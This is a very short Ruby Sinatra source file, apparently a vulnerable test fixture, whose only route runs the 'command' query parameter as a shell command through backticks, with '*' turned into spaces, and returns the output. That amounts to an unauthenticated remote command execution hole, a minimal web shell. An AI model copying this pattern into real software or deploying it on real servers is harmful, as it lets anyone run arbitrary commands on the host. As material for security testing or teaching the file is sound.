# frozen_string_literal: true

require 'sinatra'

get '/' do
  `#{params[:command].gsub('*', ' ')}`
end
